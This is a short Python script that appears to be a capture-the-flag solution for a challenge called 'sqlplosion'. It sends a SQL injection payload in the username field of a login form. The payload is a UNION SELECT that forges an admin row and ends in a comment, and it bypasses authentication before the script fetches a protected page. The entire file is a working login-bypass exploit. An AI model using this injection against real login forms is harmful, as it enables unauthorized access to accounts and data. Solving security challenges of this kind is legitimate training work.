import requests


def solve():
    url = 'https://sqlplosion.secchallenge.crysys.hu'
    data = {
        "username": "' union select 1,'somebody','somehash','admin'; -- '",
        "password": ''
    }

    session = requests.Session()
    resp = session.post(f'{url}/login.php', data=data)
    assert 'blow_up.php' in resp.text
    resp = session.get(f'{url}/blow_up.php')
    return resp.text


if __name__ == "__main__":
    print(solve())
